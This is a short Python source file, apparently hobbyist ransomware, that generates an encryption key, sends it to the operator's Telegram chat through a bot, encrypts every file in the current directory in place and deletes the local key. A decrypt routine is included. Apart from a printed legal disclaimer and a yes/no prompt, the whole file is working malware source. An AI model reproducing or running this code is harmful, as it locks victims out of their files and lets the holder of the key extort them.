import os
import telepot
from cryptography.fernet import Fernet

class YouDontKnowWhatYoureDoing(Exception):
    def __init__(self, *args: object) -> None:
        super().__init__(*args)

def ransomware(bottoken, chat_id, are_you_sure=False, keyfilename="youremakinganerror.key"):
    print("""
Don't execute this on machines or environments without permission.
this could lead to several legal consequences and I, Riccardo Zappitelli,
am not responsable for any illegal use of this code.
~ Riccardo Zappitelli""")
    if are_you_sure and input("Understand? Y/n ").lower() == "y":
        try:
            bot = telepot.Bot(bottoken)
            generate_key_file(filename=keyfilename)
            bot.sendDocument(chat_id, open(keyfilename, "rb"))
            files = [ x if x != "cry.py" and x != keyfilename and os.path.isfile(x) else None for x in os.listdir()]
            files = list(filter(lambda x: x if x else False, files))
            for file in files:
                encrypt_file(file, key_filename=keyfilename)
            os.remove(keyfilename)
        except Exception as e:
            raise e
    else:
        raise YouDontKnowWhatYoureDoing("Dumbass.")
    

def remove_danger(keyfilename):
    files = [ x if x != "cry.py" and x != keyfilename and os.path.isfile(x) else None for x in os.listdir()]
    files = list(filter(lambda x: x if x else False, files))
    for file in files:
        decrypt_file(file, key_filename=keyfilename)


def generate_key_file(path="./", filename="key.key"):
    key=Fernet.generate_key()
    with open(path+filename, "wb") as key_file:
        key_file.write(key)

def encrypt_file(filename, key=None, key_filename=None):
    if key is None and key_filename is None:
        raise TypeError("You muse specify a key or a keyfile.")
    
    if key_filename:
        with open(key_filename, "rb") as kfi:
            key = kfi.read()

    with open(filename, "rb") as fi:
        content = fi.read()
    encrypted_content = Fernet(key).encrypt(content)
    
    with open(filename, "wb") as fo:
        fo.write(encrypted_content)


def decrypt_file(filename, key=None, key_filename=None):
    if key is None and key_filename is None:
        raise TypeError("You muse specify a key or a keyfile.")
    
    if key_filename:
        with open(key_filename, "rb") as kfi:
            key = kfi.read()

    with open(filename, "rb") as fi:
        encrypted_content = fi.read()
    decrypted_content = Fernet(key).decrypt(encrypted_content)

    with open(filename, "wb") as fo:
        fo.write(decrypted_content)
